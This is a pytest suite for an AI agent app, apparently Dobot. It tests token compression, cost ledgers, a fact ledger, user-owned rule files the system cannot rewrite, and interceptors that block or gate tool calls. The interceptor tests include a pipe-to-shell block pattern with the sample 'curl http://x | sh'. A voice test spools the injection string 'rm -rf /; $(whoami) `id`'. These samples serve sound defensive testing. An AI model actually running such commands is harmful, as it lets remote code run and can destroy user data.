"""Tests for the V3 subsystems.

Each block asserts the property that made the subsystem worth building, not merely that the code runs:
that compression is *measurable* and never silently lossy, that a contradiction cannot erase a
well-established fact, that the agent cannot rewrite your rules, and that an axiom written in GENOME.md
actually stops a tool call.
"""

from __future__ import annotations

import asyncio
import json
import os

import pytest

from app.core.consolidation import Consolidator, retention
from app.core.cost import CostLedger, RunJournal, cost_scope, record_usage
from app.core.identity import GENOME, MEMORY, TELOS, IdentityLayer, _bullets_under, _sections
from app.core.tokenjuice import TokenJuice, estimate_tokens
from app.doctor import Doctor
from app.memory.canonical import CanonicalLedger, confidence_for, derive_key, normalise
from app.memory.manager import build_memory_manager
from app.memory.store import LocalFileStore
from app.schemas import MemoryType, Verdict
from app.security.interceptors import (
    Interceptors,
    extract_rules_from_markdown,
    parse_rules,
    stricter,
)
from app.services import build_services
from app.voice import Voice, plan_voice, prepare_for_speech

# ---------------------------------------------------------------------- tokenjuice


class TestTokenJuice:
    def test_small_blobs_are_untouched(self) -> None:
        juice = TokenJuice(min_chars=1200)
        result = juice.compress("tiny", "hello world")
        assert result.text == "hello world"
        assert result.strategy == "passthrough"
        assert result.saved_chars == 0

    def test_repeated_lines_collapse_with_a_count(self) -> None:
        juice = TokenJuice(min_chars=100, max_chars=2000)
        blob = "\n".join(["src/app/main.py: ok"] * 400)
        result = juice.compress("listing", blob)
        assert "×400" in result.text
        assert result.saved_chars > 0
        assert result.saved_pct > 80

    def test_dedupe_never_merges_non_adjacent_lines(self) -> None:
        """`a b a` is order-dependent; merging the two `a` lines would change the meaning."""
        juice = TokenJuice(min_chars=10, max_chars=2000)
        result = juice.compress("ordered", "alpha\nbeta\nalpha")
        assert result.text.count("alpha") == 2

    def test_long_json_keeps_shape_and_annotates_the_elision(self) -> None:
        juice = TokenJuice(min_chars=200, max_chars=900)
        blob = json.dumps({"files": [{"path": f"/tmp/f{i}.txt", "size": i} for i in range(500)]})
        result = juice.compress("fs_list", blob)
        assert result.sent_chars <= 900
        payload = json.loads(result.text)
        assert payload["files"][-1]["__elided__"] > 0

    def test_head_tail_keeps_the_end_of_a_log(self) -> None:
        """A failure is usually at the end, so the tail is the part worth keeping."""
        juice = TokenJuice(min_chars=100, max_chars=600, head_lines=5, tail_lines=5)
        blob = "\n".join([f"line {i}" for i in range(500)] + ["Traceback: the actual error"])
        result = juice.compress("log", blob)
        assert "Traceback: the actual error" in result.text
        assert len(result.text) <= 600

    def test_ledger_records_evidence(self) -> None:
        juice = TokenJuice(min_chars=50, max_chars=300)
        juice.compress("a", "x" * 5000)
        juice.compress("b", "short")
        summary = juice.summary()
        assert summary["calls"] == 2
        assert summary["saved_chars"] > 0
        assert summary["by_label"]["a"]["calls"] == 1
        assert summary["by_label"]["b"]["saved_chars"] == 0

    def test_disabled_is_a_passthrough_and_says_so(self) -> None:
        juice = TokenJuice(enabled=False, min_chars=10, max_chars=100)
        blob = "y" * 5000
        result = juice.compress("blob", blob)
        assert result.text == blob
        assert result.strategy == "disabled"
        assert result.saved_chars == 0

    def test_structured_input_is_serialised_then_compressed(self) -> None:
        juice = TokenJuice(min_chars=100, max_chars=400)
        result = juice.compress("tool-output", {"items": list(range(400))})
        assert result.original_chars > result.sent_chars
        assert json.loads(result.text)["items"][-1]["__elided__"] > 0

    def test_token_estimate_is_stable(self) -> None:
        assert estimate_tokens(4000) == 1000
        assert estimate_tokens(0) == 0


# ---------------------------------------------------------------------- cost


class TestCostLedger:
    def test_usage_is_attributed_to_the_active_scope(self, settings) -> None:
        ledger = CostLedger()
        with cost_scope(task_id="task_a", purpose="plan"):
            record_usage(
                model="nemotron-ultra",
                tier="ultra",
                usage={"prompt_tokens": 100, "completion_tokens": 20},
                settings=settings,
                ledger=ledger,
            )
        with cost_scope(task_id="task_b", purpose="answer"):
            record_usage(
                model="nemotron-ultra",
                tier="ultra",
                usage={"prompt_tokens": 7, "completion_tokens": 3},
                settings=settings,
                ledger=ledger,
            )
        assert ledger.for_task("task_a")["prompt_tokens"] == 100
        assert ledger.for_task("task_b")["prompt_tokens"] == 7
        summary = ledger.summary()
        assert summary["total_tokens"] == 130
        assert summary["by_purpose"]["plan"]["calls"] == 1

    def test_cost_is_unknown_rather_than_guessed_without_a_price(self, settings) -> None:
        ledger = CostLedger()
        entry = record_usage(
            model="m",
            tier="ultra",
            usage={"prompt_tokens": 1_000_000, "completion_tokens": 0},
            settings=settings,
            ledger=ledger,
        )
        assert entry.cost_usd == 0.0
        assert entry.priced is False

    def test_cost_is_estimated_when_a_price_is_configured(self, settings) -> None:
        settings.price_per_mtok_input = 3.0
        settings.price_per_mtok_output = 15.0
        ledger = CostLedger()
        entry = record_usage(
            model="m",
            tier="ultra",
            usage={"prompt_tokens": 1_000_000, "completion_tokens": 1_000_000},
            settings=settings,
            ledger=ledger,
        )
        assert entry.priced is True
        assert entry.cost_usd == pytest.approx(18.0)

    def test_scope_does_not_leak_between_concurrent_tasks(self, settings) -> None:
        """Two tasks running at once must not bill each other's tokens."""
        import asyncio

        ledger = CostLedger()

        async def worker(task_id: str, tokens: int) -> None:
            with cost_scope(task_id=task_id, purpose="plan"):
                await asyncio.sleep(0)
                record_usage(
                    model="m",
                    tier="ultra",
                    usage={"prompt_tokens": tokens},
                    settings=settings,
                    ledger=ledger,
                )

        async def main() -> None:
            await asyncio.gather(worker("a", 10), worker("b", 99))

        asyncio.run(main())
        assert ledger.for_task("a")["prompt_tokens"] == 10
        assert ledger.for_task("b")["prompt_tokens"] == 99


class TestRunJournal:
    async def test_entries_are_ordered_and_survive_a_rebuild(self, settings) -> None:
        store = LocalFileStore(settings.state_dir / "store")
        journal = RunJournal(store, limit=50)
        await journal.append("task_1", "request", "clean my downloads")
        await journal.append("task_1", "plan", "move 42 files")
        await journal.append("task_1", "tool", "fs_list: ok")

        reopened = RunJournal(store, limit=50)
        entries = await reopened.entries("task_1")
        assert [entry["kind"] for entry in entries] == ["request", "plan", "tool"]
        assert [entry["seq"] for entry in entries] == [1, 2, 3]

    async def test_empty_task_id_is_a_no_op(self, settings) -> None:
        store = LocalFileStore(settings.state_dir / "store")
        journal = RunJournal(store)
        assert await journal.append("", "request", "nothing") == {}

    async def test_prune_keeps_the_newest_journals(self, settings) -> None:
        store = LocalFileStore(settings.state_dir / "store")
        journal = RunJournal(store)
        for index in range(30):
            await journal.append(f"task_{index:02d}", "request", f"n{index}")
            doc = await store.get("runs", f"task_{index:02d}")
            await store.update("runs", f"task_{index:02d}", {"updated_at": f"2026-01-{index + 1:02d}"})
            assert doc is not None
        removed = await journal.prune(keep=10)
        assert removed == 20
        assert await journal.count() == 10
        assert await journal.entries("task_29")


# ---------------------------------------------------------------------- canonical


class TestCanonicalLedger:
    async def test_restating_strengthens(self, settings) -> None:
        ledger = CanonicalLedger(LocalFileStore(settings.state_dir / "store"))
        first = await ledger.state("The user is building Dobot")
        assert first.reinforcements == 1
        for _ in range(4):
            again = await ledger.state("The user is building Dobot")
        assert again.reinforcements == 5
        assert again.confidence > first.confidence
        assert len(await ledger.active()) == 1

    async def test_confidence_never_reaches_certainty(self) -> None:
        assert confidence_for(1) < confidence_for(5) < confidence_for(50) < 1.0

    async def test_a_weak_belief_is_revised_immediately(self, settings) -> None:
        ledger = CanonicalLedger(LocalFileStore(settings.state_dir / "store"), promote_after=3)
        await ledger.state("favourite editor is vim", key="editor")
        revised = await ledger.state("favourite editor is emacs", key="editor")
        assert revised.content == "favourite editor is emacs"
        assert revised.history and revised.history[0]["text"] == "favourite editor is vim"

    async def test_a_well_established_belief_resists_one_contradiction(self, settings) -> None:
        """The property that matters: one ambiguous sentence cannot erase ten confirmations."""
        ledger = CanonicalLedger(LocalFileStore(settings.state_dir / "store"), promote_after=3)
        for _ in range(4):
            await ledger.state("the deploy command is make ship", key="deploy")
        once = await ledger.state("the deploy command is make release", key="deploy")
        assert once.content == "the deploy command is make ship"
        assert once.candidates and once.candidates[0]["count"] == 1

        for _ in range(2):
            finally_revised = await ledger.state("the deploy command is make release", key="deploy")
        assert finally_revised.content == "the deploy command is make release"
        assert any(item["text"] == "the deploy command is make ship" for item in finally_revised.history)

    async def test_superseding_keeps_history_rather_than_deleting_it(self, settings) -> None:
        ledger = CanonicalLedger(LocalFileStore(settings.state_dir / "store"), promote_after=2)
        await ledger.state("lives in Berlin", key="city")
        await ledger.state("lives in Lisbon", key="city")
        facts = await ledger.active()
        assert facts[0].content == "lives in Lisbon"
        assert facts[0].history
        assert facts[0].history[0]["reason"]

    async def test_pinned_facts_survive_the_cap(self, settings) -> None:
        store = LocalFileStore(settings.state_dir / "store")
        ledger = CanonicalLedger(store, limit=4)
        pinned = await ledger.state("the project is Dobot", key="project", pinned=True)
        for index in range(10):
            await ledger.state(f"throwaway number {index}")
        active_ids = {fact.id for fact in await ledger.active(limit=50)}
        assert pinned.id in active_ids
        assert len(active_ids) <= 4

    async def test_render_is_empty_when_the_ledger_is(self, settings) -> None:
        ledger = CanonicalLedger(LocalFileStore(settings.state_dir / "store"))
        assert await ledger.render() == ""

    async def test_render_states_facts_without_confidence_noise(self, settings) -> None:
        ledger = CanonicalLedger(LocalFileStore(settings.state_dir / "store"))
        await ledger.state("the user's name is Sam")
        rendered = await ledger.render()
        assert "the user's name is Sam" in rendered
        assert "CANONICAL FACTS" in rendered

    async def test_promotion_counts_only_repeated_statements(self, settings) -> None:
        store = LocalFileStore(settings.state_dir / "store")
        ledger = CanonicalLedger(store, promote_after=3)

        class Fake:
            def __init__(self, content: str, importance: float = 0.6) -> None:
                self.content = content
                self.importance = importance
                self.type = MemoryType.FACT

        result = await ledger.consolidate_from(
            [
                Fake("mentioned once, should not promote"),
                Fake("stated three times"),
                Fake("stated three times"),
                Fake("stated three times"),
            ]
        )
        assert result["promoted"] == 1
        assert [fact.content for fact in await ledger.active()] == ["stated three times"]

    def test_key_derivation_is_case_and_punctuation_insensitive(self) -> None:
        assert derive_key("The user is building Dobot!") == derive_key("the user is building dobot")
        assert normalise("  A   B  ") == "a b"

    async def test_forget_and_pin(self, settings) -> None:
        ledger = CanonicalLedger(LocalFileStore(settings.state_dir / "store"))
        fact = await ledger.state("something")
        assert await ledger.pin(fact.id, pinned=True)
        assert (await ledger.get(fact.id)).pinned is True
        assert await ledger.pin(fact.id, pinned=False)
        assert await ledger.forget(fact.id) is True
        assert await ledger.forget(fact.id) is False


# ---------------------------------------------------------------------- identity


class TestIdentityLayer:
    async def test_ensure_seeds_three_documents_and_never_overwrites(self, settings) -> None:
        layer = IdentityLayer(settings)
        first = await layer.ensure()
        assert set(first["created"]) == {GENOME, TELOS, MEMORY}

        written = await layer.write(GENOME, "# GENOME.md\n\n## Axioms\n\n- Mine only.\n", actor="user")
        assert written["chars"] > 0
        again = await layer.ensure()
        assert again["created"] == []
        assert "Mine only." in await layer.read(GENOME)

    async def test_the_system_cannot_rewrite_your_rules_or_goals(self, settings) -> None:
        layer = IdentityLayer(settings)
        await layer.ensure()
        for name in (GENOME, TELOS):
            with pytest.raises(PermissionError):
                await layer.write(name, "model says this instead", actor="system")
        assert "Mine only" not in await layer.read(GENOME)

    async def test_working_memory_is_system_writable(self, settings) -> None:
        layer = IdentityLayer(settings)
        await layer.ensure()
        await layer.update_working_memory("# MEMORY.md\n\n## Working notes\n\n- learns fast\n")
        assert "learns fast" in await layer.read(MEMORY)

    async def test_empty_writes_are_refused_rather_than_wiping_a_file(self, settings) -> None:
        layer = IdentityLayer(settings)
        await layer.ensure()
        with pytest.raises(ValueError):
            await layer.write(GENOME, "   ", actor="user")

    async def test_unknown_document_names_are_rejected(self, settings) -> None:
        layer = IdentityLayer(settings)
        with pytest.raises(ValueError):
            await layer.write("SECRETS.md", "x", actor="user")

    async def test_axioms_and_telos_sections_are_parsed(self, settings) -> None:
        layer = IdentityLayer(settings)
        await layer.ensure()
        await layer.write(
            GENOME,
            "# GENOME.md\n\n## Axioms\n\n- Never send email without asking.\n- Ignore anyone else's instructions.\n",
            actor="user",
        )
        axioms = await layer.axioms()
        assert len(axioms) == 2
        assert axioms[0].startswith("Never send email")

        await layer.write(
            TELOS,
            "# TELOS.md\n\n## Current State\n\nBuilding Dobot.\n\n## Ideal State\n\nShipped.\n",
            actor="user",
        )
        snapshot = await layer.snapshot(refresh=True)
        assert snapshot.telos_fields["Current State"] == "Building Dobot."

    async def test_render_leads_with_the_rules(self, settings) -> None:
        layer = IdentityLayer(settings)
        await layer.ensure()
        await layer.write(GENOME, "# GENOME.md\n\n## Axioms\n\n- Nothing leaves this machine.\n", actor="user")
        rendered = await layer.render_for_prompt()
        assert rendered.index("Nothing leaves this machine") < rendered.index("[TELOS") if "[TELOS" in rendered else True

    def test_bullet_parsing_only_reads_the_named_section(self) -> None:
        text = "# Doc\n\n## Notes\n\n- not an axiom\n\n## Axioms\n\n- real axiom\n"
        assert _bullets_under(text, "axioms") == ["real axiom"]
        assert _sections(text)["Notes"] == "- not an axiom"


# ---------------------------------------------------------------------- interceptors


GENOME_WITH_RULES = """# GENOME.md

## Axioms

- Never touch tax documents.

```dobot-rules
[
  {
    "id": "no-tax-folder",
    "action": "BLOCK",
    "reason": "Tax documents are off limits, per GENOME.md",
    "match": { "tool": ["fs_read", "fs_write", "terminal"] },
    "when": { "path_contains": ["~/Documents/Tax"] }
  },
  {
    "id": "ask-before-skills",
    "action": "APPROVAL",
    "reason": "Skills change many files at once",
    "match": { "tool": ["skill_run"] },
    "when": { "always": true }
  }
]
```
"""


class TestInterceptors:
    def test_rules_are_extracted_from_the_markdown_fence(self) -> None:
        rules, errors = extract_rules_from_markdown(GENOME_WITH_RULES, source="genome")
        assert errors == []
        assert {rule.id for rule in rules} == {"no-tax-folder", "ask-before-skills"}

    def test_a_genome_axiom_becomes_a_blocking_code_path(self) -> None:
        """A rule written in prose in GENOME.md stops the call - the model does not get a say."""
        engine = Interceptors()
        engine.load(genome_markdown=GENOME_WITH_RULES)
        absolute = os.path.expanduser("~/Documents/Tax/2025.pdf")
        outcome = engine.evaluate("fs_write", {"path": absolute})
        assert outcome.verdict is Verdict.BLOCK
        assert outcome.fired == ["no-tax-folder"]
        assert "off limits" in outcome.reasons[0]

    def test_a_tilde_rule_follows_the_actual_home_directory(self) -> None:
        """`~` is expanded against the real home, so the rule travels with the user."""
        engine = Interceptors()
        engine.load(genome_markdown=GENOME_WITH_RULES)
        assert (
            engine.evaluate("fs_read", {"path": os.path.expanduser("~/.ssh/id_rsa")}).verdict
            is Verdict.ALLOW
        )
        assert engine.evaluate("fs_read", {"path": "~/Documents/notes.md"}).verdict is Verdict.ALLOW

    def test_rules_are_scoped_to_the_tools_they_name(self) -> None:
        engine = Interceptors()
        engine.load(genome_markdown=GENOME_WITH_RULES)
        assert engine.evaluate("fs_write", {"path": "~/Documents/Tax/a.pdf"}).verdict is Verdict.BLOCK
        assert engine.evaluate("tavily_research", {"query": "Tax form"}).verdict is Verdict.ALLOW

    def test_an_unrelated_call_is_untouched(self) -> None:
        engine = Interceptors()
        engine.load(genome_markdown=GENOME_WITH_RULES)
        outcome = engine.evaluate("fs_read", {"path": "~/Documents/notes.md"})
        assert outcome.verdict is Verdict.ALLOW
        assert outcome.fired == []

    def test_approval_rules_and_annotations(self) -> None:
        engine = Interceptors()
        engine.load(genome_markdown=GENOME_WITH_RULES)
        assert engine.evaluate("skill_run", {"name": "clean_downloads"}).verdict is Verdict.APPROVAL

        annotating, errors = parse_rules(
            [
                {
                    "id": "note-it",
                    "action": "ANNOTATE",
                    "reason": "remember this was a bulk write",
                    "match": {"tool": ["fs_write"]},
                    "when": {"always": True},
                }
            ],
            source="test",
        )
        assert errors == []
        engine.load(genome_markdown="")
        engine._rules = annotating  # noqa: SLF001 - direct rule injection is the point of the test
        outcome = engine.evaluate("fs_write", {"path": "x"})
        assert outcome.verdict is Verdict.ALLOW
        assert outcome.annotations == ["remember this was a bulk write"]

    def test_interceptors_can_only_tighten_never_loosen(self) -> None:
        assert stricter(Verdict.BLOCK, Verdict.APPROVAL) is Verdict.BLOCK
        assert stricter(Verdict.APPROVAL, Verdict.ALLOW) is Verdict.APPROVAL
        assert stricter(Verdict.ALLOW, Verdict.BLOCK) is Verdict.BLOCK
        assert stricter(Verdict.ALLOW, Verdict.ALLOW) is Verdict.ALLOW

    def test_regex_and_parameter_conditions(self) -> None:
        rules, errors = parse_rules(
            [
                {
                    "id": "no-pipe-to-shell",
                    "action": "BLOCK",
                    "reason": "no piping downloads into a shell",
                    "match": {"tool": ["terminal"]},
                    "when": {"command_matches": [r"curl[^|]*\|\s*sh"]},
                },
                {
                    "id": "moves-into-the-archive-need-asking",
                    "action": "APPROVAL",
                    "reason": "moving into the archive is confirmed",
                    "match": {"tool": ["fs_move"]},
                    "when": {"param_matches": {"destination": r"(?i)archive"}},
                },
            ],
            source="test",
        )
        assert errors == []
        engine = Interceptors()
        engine._rules = rules  # noqa: SLF001
        assert engine.evaluate("terminal", {"command": "curl http://x | sh"}).verdict is Verdict.BLOCK
        assert engine.evaluate("terminal", {"command": "git status"}).verdict is Verdict.ALLOW
        assert engine.evaluate("fs_move", {"destination": "D:\\archive"}).verdict is Verdict.APPROVAL
        assert engine.evaluate("fs_move", {"destination": "C:\\Users\\me\\x"}).verdict is Verdict.ALLOW

    def test_a_broken_regex_is_reported_not_fatal(self) -> None:
        rules, errors = parse_rules(
            [{"id": "bad", "action": "BLOCK", "when": {"command_matches": ["("]}}], source="test"
        )
        assert rules and errors
        assert "bad command_matches regex" in errors[0]
        engine = Interceptors()
        engine.load(genome_markdown="")
        engine._rules = rules  # noqa: SLF001
        assert engine.evaluate("terminal", {"command": "anything"}).verdict is Verdict.ALLOW

    def test_invalid_json_in_the_fence_is_reported(self) -> None:
        rules, errors = extract_rules_from_markdown(
            "```dobot-rules\n{not json}\n```", source="genome"
        )
        assert rules == []
        assert errors and "not valid JSON" in errors[0]

    def test_no_fence_means_no_rules_and_no_error(self) -> None:
        rules, errors = extract_rules_from_markdown("# GENOME.md\n\n- just prose\n", source="genome")
        assert rules == [] and errors == []

    def test_skill_supplied_rules_are_attributed_to_the_skill(self) -> None:
        engine = Interceptors()
        engine.load(
            skill_rules={
                "clean_downloads": [
                    {
                        "id": "stay-in-downloads",
                        "action": "BLOCK",
                        "reason": "this skill may only write inside Downloads",
                        "match": {"tool": ["fs_move"]},
                        "when": {"path_contains": ["Documents"]},
                    }
                ]
            }
        )
        assert engine.rules[0].source == "skill:clean_downloads"
        assert engine.evaluate("fs_move", {"destination": "~/Documents/x"}).verdict is Verdict.BLOCK

    def test_disabled_engine_never_fires(self) -> None:
        engine = Interceptors(enabled=False)
        engine.load(genome_markdown=GENOME_WITH_RULES)
        assert engine.evaluate("fs_write", {"path": "~/Documents/Tax/a.pdf"}).verdict is Verdict.ALLOW


# ---------------------------------------------------------------------- consolidation


class TestConsolidation:
    def test_retention_falls_with_age_and_rises_with_use(self) -> None:
        fresh = retention(importance=0.5, access_count=0, age_days=0)
        old = retention(importance=0.5, access_count=0, age_days=60)
        used = retention(importance=0.5, access_count=20, age_days=60)
        assert fresh == 1.0
        assert old < fresh
        assert used > old

    def test_higher_importance_decays_more_slowly(self) -> None:
        assert retention(importance=0.7, access_count=0, age_days=40) > retention(
            importance=0.2, access_count=0, age_days=40
        )

    async def test_the_pass_merges_forgets_promotes_and_writes_notes(self, settings) -> None:
        store = LocalFileStore(settings.state_dir / "store")
        memory = build_memory_manager(store)
        ledger = CanonicalLedger(store, promote_after=2)
        identity = IdentityLayer(settings)
        await identity.ensure()
        consolidator = Consolidator(
            memory=memory, canonical=ledger, identity=identity, settings=settings
        )

        # Three identical statements: one survives, the duplicates merge, and the fact promotes.
        for _ in range(3):
            await memory.remember("the user prefers short answers", type=MemoryType.PREFERENCE)

        # One stale, low-importance memory: it should be forgotten by decay.
        stale = await memory.remember("a passing detail", type=MemoryType.EPISODE, importance=0.1)
        await store.update(
            "memories", stale.id, {"created_at": "2020-01-01T00:00:00+00:00", "importance": 0.05}
        )

        report = await consolidator.run()
        assert report.scanned >= 4
        assert report.merged == 2
        assert report.forgotten == 1
        assert report.promoted == 1
        assert report.notes_written is True
        assert "prefers short answers" in await ledger.render()
        assert "Working notes" in await identity.read(MEMORY)
        assert await memory.get(stale.id) is None

    async def test_important_memories_are_never_forgotten(self, settings) -> None:
        store = LocalFileStore(settings.state_dir / "store")
        memory = build_memory_manager(store)
        identity = IdentityLayer(settings)
        await identity.ensure()
        consolidator = Consolidator(
            memory=memory, canonical=CanonicalLedger(store), identity=identity, settings=settings
        )
        kept = await memory.remember("I am allergic to peanuts", type=MemoryType.FACT, importance=0.9)
        await store.update("memories", kept.id, {"created_at": "2020-01-01T00:00:00+00:00"})
        report = await consolidator.run()
        assert report.forgotten == 0
        assert report.protected == 1
        assert await memory.get(kept.id) is not None

    async def test_dry_run_changes_nothing(self, settings) -> None:
        store = LocalFileStore(settings.state_dir / "store")
        memory = build_memory_manager(store)
        identity = IdentityLayer(settings)
        await identity.ensure()
        before = await identity.read(MEMORY)
        consolidator = Consolidator(
            memory=memory, canonical=CanonicalLedger(store), identity=identity, settings=settings
        )
        stale = await memory.remember("stale", type=MemoryType.EPISODE, importance=0.05)
        await store.update("memories", stale.id, {"created_at": "2020-01-01T00:00:00+00:00"})
        report = await consolidator.run(dry_run=True)
        assert report.dry_run is True
        assert report.forgotten == 1
        assert await memory.get(stale.id) is not None
        assert await identity.read(MEMORY) == before

    async def test_a_consolidation_pass_is_recorded_on_the_journal_pruner(self, settings) -> None:
        store = LocalFileStore(settings.state_dir / "store")
        memory = build_memory_manager(store)
        journal = RunJournal(store, limit=20)
        for index in range(25):
            await journal.append(f"t{index:02d}", "request", "x")
            await store.update("runs", f"t{index:02d}", {"updated_at": f"2026-01-{index + 1:02d}"})
        settings.run_journal_keep = 20
        consolidator = Consolidator(
            memory=memory,
            canonical=CanonicalLedger(store),
            identity=None,
            settings=settings,
            journal=journal,
        )
        report = await consolidator.run()
        assert report.journals_pruned == 5
        assert await journal.count() == 20


# ---------------------------------------------------------------------- voice


class TestVoice:
    def test_markdown_is_stripped_before_speaking(self) -> None:
        spoken = prepare_for_speech("## Done\n\nI moved **42** files to `~/Archive`.\n\n```py\nx=1\n```")
        assert "**" not in spoken
        assert "##" not in spoken
        assert "code block omitted" in spoken
        assert "42" in spoken

    def test_very_long_text_is_cut_on_a_word_boundary(self) -> None:
        spoken = prepare_for_speech("word " * 1000, max_chars=100)
        assert len(spoken) <= 110
        assert spoken.endswith("…")

    def test_plan_voice_is_pure_inspection(self) -> None:
        """Whatever engine this machine has, probing must never raise and must explain itself."""
        plan = plan_voice()
        assert isinstance(plan.engine, str)
        assert plan.engine or (plan.fix and plan.detail)

    async def test_speaking_is_refused_when_voice_is_off(self, settings) -> None:
        settings.voice_enabled = False
        voice = Voice(settings)
        result = await voice.speak("hello")
        assert result.ok is False
        assert "disabled" in result.detail

    async def test_force_can_test_an_engine_that_is_off(self, settings) -> None:
        settings.voice_enabled = False
        voice = Voice(settings)
        voice._plan = type(voice.plan)(engine="", fix="no engine here", detail="none")  # noqa: SLF001
        result = await voice.speak("hello", force=True)
        assert result.ok is False
        assert "no engine here" in result.detail

    def test_nothing_user_authored_reaches_a_command_line(self, settings) -> None:
        """The text is spooled to a temp file; the argv carries only our own generated path."""
        voice = Voice(settings)
        path = voice._spool("rm -rf /; $(whoami) `id`\n")  # noqa: SLF001
        try:
            assert path.read_text(encoding="utf-8").startswith("rm -rf /")
            assert "-" in path.name
        finally:
            path.unlink(missing_ok=True)


# ---------------------------------------------------------------------- doctor + api


class TestDoctorAndApi:
    async def test_doctor_reports_missing_capabilities_with_fixes(self, settings, bus) -> None:
        graph = await build_services(settings, bus=bus)
        await graph.startup()
        try:
            report = await Doctor(graph).report()
        finally:
            await graph.shutdown()
        ids = {capability["id"] for capability in report["capabilities"]}
        assert {"reasoning", "sandbox", "identity", "axiom_enforcement", "voice"} <= ids
        reasoning = next(c for c in report["capabilities"] if c["id"] == "reasoning")
        assert reasoning["state"] == "not_configured"
        assert "NEBIUS_API_KEY" in reasoning["fix"]
        assert report["overall"] in {"healthy", "degraded"}
        assert report["counts"]

    async def test_doctor_flags_prose_axioms_as_unenforced(self, settings, bus) -> None:
        """The single most valuable check: a rule written but not applied looks identical to a working one."""
        graph = await build_services(settings, bus=bus)
        await graph.startup()
        try:
            # The seeded GENOME.md ships an enforceable block, so out of the box the axioms are real.
            report = await Doctor(graph).report()
            axiom = next(c for c in report["capabilities"] if c["id"] == "axiom_enforcement")
            assert axiom["state"] == "live"

            # Replace it with prose only: the rules stop being enforced, and the Doctor must say so
            # rather than reporting a healthy system.
            await graph.identity.write(GENOME, "# GENOME.md\n\n## Axioms\n\n- Be careful.\n", actor="user")
            await graph.reload_interceptors()
            report = await Doctor(graph).report()
            axiom = next(c for c in report["capabilities"] if c["id"] == "axiom_enforcement")
            assert axiom["state"] == "not_configured"
            assert "dobot-rules" in axiom["fix"]

            # And restoring the block brings enforcement back.
            await graph.identity.write(GENOME, GENOME_WITH_RULES, actor="user")
            await graph.reload_interceptors()
            report = await Doctor(graph).report()
            axiom = next(c for c in report["capabilities"] if c["id"] == "axiom_enforcement")
            assert axiom["state"] == "live"
            assert "2" in axiom["detail"]
        finally:
            await graph.shutdown()

    async def test_identity_survives_a_service_restart(self, settings, bus) -> None:
        first = await build_services(settings, bus=bus)
        await first.startup()
        await first.identity.write(GENOME, "# GENOME.md\n\n## Axioms\n\n- Mine only.\n", actor="user")
        await first.shutdown()

        second = await build_services(settings, bus=bus)
        await second.startup()
        try:
            assert "Mine only." in await second.identity.read(GENOME)
            assert await second.identity.axioms() == ["Mine only."]
        finally:
            await second.shutdown()

    async def test_canonical_facts_are_injected_into_every_context(self, settings, bus) -> None:
        graph = await build_services(settings, bus=bus)
        await graph.startup()
        try:
            await graph.canonical.state("the user's project is called Dobot")
            request = graph.context_request_factory(message="what should I work on?")
            bundle = await graph.context.build(request)
            assert any("Dobot" in fact for fact in bundle.canonical_facts)
            rendered = bundle.as_prompt_context()
            assert "LONG-STANDING FACTS" in rendered
        finally:
            await graph.shutdown()

    def test_api_token_gate_is_opt_in_and_defaults_open(self, settings) -> None:
        assert settings.api_auth_required is False
        settings.dobot_api_token = "s3cret"
        assert settings.api_auth_required is True
        assert "s3cret" in settings.secret_values


# ---------------------------------------------------------------------- api surface


@pytest.fixture()
def client(settings, bus):
    from fastapi.testclient import TestClient

    from app.main import create_app

    app = create_app(settings)
    with TestClient(app) as test_client:
        yield test_client


class TestSystemApi:
    def test_doctor_endpoint(self, client) -> None:
        response = client.get("/doctor")
        assert response.status_code == 200
        body = response.json()
        assert "capabilities" in body and body["capabilities"]

    def test_usage_endpoint_includes_compression_evidence(self, client) -> None:
        body = client.get("/system/usage").json()
        assert "model" in body and "tokenjuice" in body
        assert body["tokenjuice"]["enabled"] is True

    def test_identity_endpoints_round_trip(self, client) -> None:
        summary = client.get("/identity").json()
        assert set(summary["documents"]) == {GENOME, TELOS, MEMORY}
        assert summary["documents"][GENOME]["owned_by"] == "user"

        saved = client.put(
            "/identity/GENOME.md",
            json={"content": "# GENOME.md\n\n## Axioms\n\n- Nothing leaves this machine.\n"},
        )
        assert saved.status_code == 200
        # Saving GENOME.md recompiles the rule set immediately, so a guard can never go stale.
        assert saved.json()["interceptors"]["count"] >= 0
        assert client.get("/identity/GENOME.md").json()["content"].startswith("# GENOME.md")

    def test_unknown_identity_document_is_a_404(self, client) -> None:
        assert client.get("/identity/PASSWORDS.md").status_code == 404

    def test_canonical_endpoints(self, client) -> None:
        created = client.post("/canonical", json={"content": "the user is building Dobot"})
        assert created.status_code == 200
        fact_id = created.json()["id"]
        again = client.post("/canonical", json={"content": "the user is building Dobot"})
        assert again.json()["reinforcements"] == 2
        assert len(client.get("/canonical").json()["facts"]) == 1
        assert client.post(f"/canonical/{fact_id}/pin").json()["pinned"] is True
        assert client.delete(f"/canonical/{fact_id}").json()["deleted"] is True
        assert client.delete(f"/canonical/{fact_id}").status_code == 404

    def test_interceptor_debugger(self, client) -> None:
        client.put(
            "/identity/GENOME.md",
            json={"content": GENOME_WITH_RULES},
        )
        body = client.post(
            "/interceptors/evaluate",
            json={"tool": "fs_write", "params": {"path": "~/Documents/Tax/2025.pdf"}},
        ).json()
        assert body["outcome"]["verdict"] == "BLOCK"
        assert body["outcome"]["fired"] == ["no-tax-folder"]

        allowed = client.post(
            "/interceptors/evaluate", json={"tool": "fs_read", "params": {"path": "~/notes.md"}}
        ).json()
        assert allowed["outcome"]["verdict"] == "ALLOW"

    def test_interceptor_reload_picks_up_a_new_skill_rule(self, client, settings) -> None:
        skills_dir = settings.skills_dir
        skill = skills_dir / "bulk_move"
        skill.mkdir(parents=True, exist_ok=True)
        (skill / "SKILL.md").write_text(
            "---\nname: bulk_move\ndescription: move many files\n---\n\nMove files.\n", encoding="utf-8"
        )
        (skill / "workflow.json").write_text(
            json.dumps(
                {
                    "steps": [{"tool": "fs_move", "params": {}}],
                    "interceptors": [
                        {
                            "id": "bulk-move-guard",
                            "action": "APPROVAL",
                            "reason": "bulk moves are confirmed",
                            "match": {"tool": ["fs_move"]},
                            "when": {"always": True},
                        }
                    ],
                }
            ),
            encoding="utf-8",
        )
        services = client.app.state.services
        services.skills.load(force=True)
        reloaded = client.post("/interceptors/reload").json()
        assert "bulk-move-guard" in reloaded["ids"]
        assert reloaded["summary"]["by_source"].get("skill:bulk_move") == 1

    def test_voice_endpoints_report_the_engine_without_speaking(self, client) -> None:
        body = client.get("/voice").json()
        assert "engine" in body and "probe" in body
        assert body["enabled"] is False

    def test_speaking_with_voice_off_is_a_conflict_not_a_crash(self, client) -> None:
        response = client.post("/voice/speak", json={"text": "hello"})
        assert response.status_code == 409
